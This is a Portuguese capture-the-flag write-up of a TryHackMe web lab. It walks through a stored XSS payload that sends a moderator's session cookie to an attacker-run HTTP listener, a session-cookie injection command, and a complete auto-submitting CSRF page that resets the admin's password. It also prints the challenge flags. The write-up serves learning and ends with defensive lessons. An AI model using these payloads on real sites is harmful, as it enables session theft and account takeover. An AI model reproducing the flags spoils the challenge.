# Whats Your Name?
###### Solved by @Juh-s
>This is a challenge about Web Exploitation, XSS and CSRF
## Sobre o desafio

This [challenge](https://tryhackme.com/room/whatsyourname) will test client-side exploitation skills, from inspecting Javascript to manipulating cookies to launching CSRF/XSS attacks. To start the VM, click the Start Machine button at the top right of the task.

You will find all the necessary tools to complete the challenge, like Nmap, PHP shells, and many more on the AttackBox. Also, please add the hostname `worldwap.thm` in the `hosts` file.

_"Never click on links received from unknown sources. Can you capture the flags and get admin access to the web app?"_

What is the flag value after accessing the moderator account?

What is the flag value after accessing the admin panel?

**Tradução**

Este [desafio](https://tryhackme.com/room/whatsyourname) testará habilidades de exploração do lado do cliente, desde a inspeção de Javascript até a manipulação de cookies e o lançamento de ataques CSRF/XSS. Para iniciar a VM, clique no botão Iniciar Máquina no canto superior direito da tarefa.

Você encontrará todas as ferramentas necessárias para completar o desafio, como Nmap, shells PHP e muitas outras na AttackBox. Além disso, por favor, adicione o hostname `worldwap.thm` no arquivo `hosts`.

_"Nunca clique em links recebidos de fontes desconhecidas. Você consegue capturar as flags e obter acesso de administrador ao aplicativo web?"_

Qual é o valor da flag após acessar a conta de moderador?

Qual é o valor da flag após acessar o painel de administração?

## Introdução

Ao acessar a VM, a primeira coisa que precisa ser feita é adicionar o hostname `worldwap.thm` no arquivo `hosts` de acordo com as instruções. Para isso, basta entrar no terminal e digitar os comandos: `nano /etc/hosts` em seguida adicionar uma linha no final do arquivo com o IP da máquina alvo e o nome do domínio `10.65.169.52 worldwap.thm`.

<img width="820" height="543" alt="image" src="https://github.com/user-attachments/assets/77c72f4e-40c5-48e2-bebb-b1f21c53d447" />

Feito isso, basta acessar o site no navegador `http://worldwap.thm` em vez do IP numérico.

Ao acessar o site, essa é sua aparência:

<img width="1900" height="820" alt="image" src="https://github.com/user-attachments/assets/20d99199-99da-45a5-aec9-12b7496035b5" />

Podemos observar um botão no canto superior direito escrito `Register` e ao clicá-lo temos essa interface:

<img width="1902" height="770" alt="image" src="https://github.com/user-attachments/assets/39f528d3-f54b-4068-b212-86afa5372f79" />

É importante perceber a mensagem que está sendo informada: `You can now pre-register! Your details will be reviewed by the site moderator.` Ou seja, nossos dados de cadastro serão consultados pelo moderador do site.

**Análise Inicial**

Partindo para a interação com o site, devemos preencher o registro:

<img width="1901" height="767" alt="image" src="https://github.com/user-attachments/assets/9679dcac-4ca9-4382-96a7-de2dc0f1cabb" />

Logo em seguida ele pede para logarmos e clicando no botão `OK` somos redirecionados para essa página:

<img width="1898" height="773" alt="image" src="https://github.com/user-attachments/assets/5de5624d-b2de-41a6-aa68-e00c06756ccf" />

Porém, ao preenchermos os dados o site nos traz um aviso, mostrando que não é possível fazer o login, visto que não somos usuários verificados, assim como a mensagem na parte do registro nos informou.

<img width="1317" height="443" alt="image" src="https://github.com/user-attachments/assets/17bb6a04-c48d-4472-ac48-77e7b362b220" />

Além disso, o site nos trouxe uma informação importante, que é a existência de um subdomínio chamado `login.worldwap.thm`, porque ele também precisa ser adicionado no arquivo `/etc/hosts` para ser reconhecido.

Ao fazer esse procedimento novamente, é possível acessar o subdomínio.

Porém, ao acessar o endereço, o retorno é apenas uma página em branco. Dessa forma, uma ação válida em desafios web é analisar o código-fonte da página visto que muitas das vezes os desenvolvedores deixam links ou comentários no HTML que revelam arquivos ocultos.

Feito isso, obtemos a resposta para a página em branco:

<img width="1908" height="277" alt="image" src="https://github.com/user-attachments/assets/5602a248-7c7c-452f-b946-563c680cd8d7" />

O desenvolvedor deixou um comentário que diz: "login.php deve ser atualizado até segunda-feira para o redirecionamento correto." ou seja, é necessário ajustar o endereço para que seja possível acessar a página corretamente.

Com isso, chegamos a essa interface:

<img width="1907" height="772" alt="image" src="https://github.com/user-attachments/assets/d0a4fce5-e85b-4da6-a4be-2dd93287369a" />

## Análise da primeira flag

**Contextualização**

Ao chegarmos na página de login, precisaremos de um usuário válido para podermos acessar, mas além disso precisamos que o usuário seja o moderador ou o administrador para encontrarmos as flags que o desafio pede.

O que acontece é: O moderador vai abrir uma página administrativa para ver a lista de novos usuários (incluindo o usuário que registrei sendo "juh"). Se colocarmos um código malicioso no cadastro, quando o moderador olhar para ele, o navegador dele vai executar o código e nos enviar o cookie dele.

O motivo pelo qual precisamos do cookie do moderador é porque ele é a única maneira de acessar o painel do moderador sem saber sua senha.

**Método usado**

Voltando para a tela de registro, tentei rodar um script no último campo `Name` para analisar se o site aceita XSS:

<img width="1897" height="725" alt="image" src="https://github.com/user-attachments/assets/fc60dbe4-de86-40e6-976b-4ed2690f216a" />

Feito isso, conseguimos entender que o site não tem barreiras que invalidem os caracteres ou que tirem as tags como o `<script>`. Porém, com esse código não é possível obter nenhuma informação relevante, visto que ele só criará um aviso na tela do moderador.

Como sabemos que é possível injetar scripts maliciosos, o objetivo é tentar roubar o cookie do moderador. Para isso, irei registrar outro usuário e na parte do `Name` colocarei o seguinte script: `<script>new Image().src='http://10.64.78.46:8000/?c='+document.cookie</script>`

Mas antes disso, é importante criar um receptor que receberá o cookie quando o script rodar na sessão do moderador. Para isso, digitei esse comando no terminal e deixei ele rodando: `python3 -m http.server 8000`

Feito isso, ao registrar uma nova conta que irá mandar o cookie do moderador para o meu terminal, temos que:

<img width="824" height="522" alt="image" src="https://github.com/user-attachments/assets/27a66a85-6e2d-468e-91f0-1908ccda454c" />

Porém, os cookies resetam de 1 em 1 minuto, o que dificulta o acesso caso não seja feito rapidamente.

Mas é possível adicionar ao console da página de login o seguinte comando: `document.cookie="PHPSESSID=CODIGO_NOVO; path=/; domain=.worldwap.thm"; location.reload();`, que irá:

* Gravar o cookie do moderador no meu navegador.
* Recarrega a página imediatamente `(location.reload())`.
* Garantir que o navegador entenda que esse cookie vale para todos os subdomínios.

Seguindo esse passo a passo, conseguimos acessar o painel do moderador e obter a primeira flag:

<img width="1897" height="767" alt="image" src="https://github.com/user-attachments/assets/fa33218c-c861-490e-b41b-e52e3cde3ee3" />

## Análise da segunda flag

**Contextualização**

Ao analisar a página do moderador é possivel observar uma área de chat disponível e ao clicar nela temos:

<img width="1902" height="772" alt="image" src="https://github.com/user-attachments/assets/93d0bbd2-eda3-4dac-9441-666ad9126921" />

Ao fazer um teste enviando um link com um código para o administrador, é possível ver no terminal que ele acessou o link enviado.

<img width="795" height="21" alt="Screenshot 2025-11-25 165519" src="https://github.com/user-attachments/assets/85321de2-c038-43c8-8047-7c453e74a6e3" />

**Método usado**

Sabendo disso, podemos utilizar a técnica de CSRF para fazer com que o admin clique no link que irá mudar automaticamente a sua senha de acesso para uma nova que determine. Para isso, é necessário descobrir como o formulário de `Change Password` funciona:
 
<img width="739" height="433" alt="Screenshot 2025-11-25 164617" src="https://github.com/user-attachments/assets/a7a1c47b-ea07-42e1-9c69-831416f0f54b" />

E ao inspecionar, observo os campos de senha:

<img width="1898" height="726" alt="Screenshot 2025-11-25 164737" src="https://github.com/user-attachments/assets/4820c77a-c0f7-4708-9962-38ddbf390ad6" />

Depois é necessário criar uma página maliciosa que irá trocar a senha do admin assim que ele acessar o link. O código usado foi esse:
```
<html>
  <body>
    <form action="http://login.worldwap.thm/change_password.php" method="POST">
      
      <input type="hidden" name="new_password" value="juh123">
      
      <input type="submit" value="Mudar Senha">
    </form>
    
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
<img width="1909" height="722" alt="Screenshot 2025-11-25 165114" src="https://github.com/user-attachments/assets/4392f09e-6296-4af2-ba3a-a553abb6e84f" />

Como o terminal já estava rodando o comando: `python3 -m http.server 8000`, conseguimos ver novamente se o admin acessou o link enviado

<img width="1066" height="34" alt="Screenshot 2025-11-25 165137" src="https://github.com/user-attachments/assets/a8290262-adcf-46d9-a2e6-cee12da73475" />

O retorno foi do código 200, que significa que a solicitação foi bem-sucedida. Ou seja, a senha do administrador foi alterada e agora é só dar `Logout` na página do moderador e acessar o painel do admin usando as credenciais: `Username: Admin` e `Password: juh123`.

Com isso, obtemos a segunda flag por meio de CSRF.

<img width="1905" height="727" alt="Screenshot 2025-11-25 165634" src="https://github.com/user-attachments/assets/92cd272a-0e9e-4c2d-bd76-24131573b713" />

## Solução

As flags encontradas para os desafios foram:

Flag do painel do moderador:

>`ModP@wnEd`

Flag do painel do administrador:

>`AdM!nP@wnEd`

**Aplicação no dia a dia**

A primeira vulnerabilidade se concentrava em Stored XSS, onde era possível adicionar um script ao nome do usuário, possibilitando o roubo dos cookies do moderador através do código que retornava seu valor. É importante entender essa fraqueza para que o sistema nunca salve o input do usuário sem antes valida-lo.

Além disso, o ataque só funcionou porque o desenvolvedor não marcou o cookie como [`HttpOnly`](https://owasp.org/www-community/HttpOnly) permitindo que ele fosse visto e alterado pelo usuário.

Já para a segunda vulnerabilidade de CSRF, foi possível enviar um link no chat que ao ser acessado pelo admin, alterava sua senha. Isso explica por que bancos e sites sérios pedem a senha antiga para a criação de uma nova.

Portanto, esse desafio foi bem completo ao abordar essas vulnerabilidades para entendermos como elas funcionam e como podem ser perigosas no dia a dia.


